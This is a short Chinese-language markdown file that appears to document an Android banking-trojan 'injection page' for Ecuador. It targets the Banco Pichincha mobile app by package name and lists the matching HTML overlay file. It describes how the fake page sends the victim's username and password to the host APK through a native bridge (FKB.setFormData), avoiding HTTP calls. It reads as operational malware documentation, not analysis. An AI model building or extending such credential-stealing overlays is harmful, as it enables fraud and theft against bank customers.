# 厄瓜多尔（EC）注入页

| 品牌 | 包名 | 文件 |
|---|---|---|
| Banca móvil（Banco Pichincha） | com.yellowpepper.pichincha | `com.yellowpepper.pichincha.html` |

## 协议

只走 APK 原生桥（`FKB.setFormData` / `FKB.setClosePage`），
载荷：`{pkg, sn, template:'pichincha', formData:{username, password}}`。
页面内无任何 HTTP 外发。
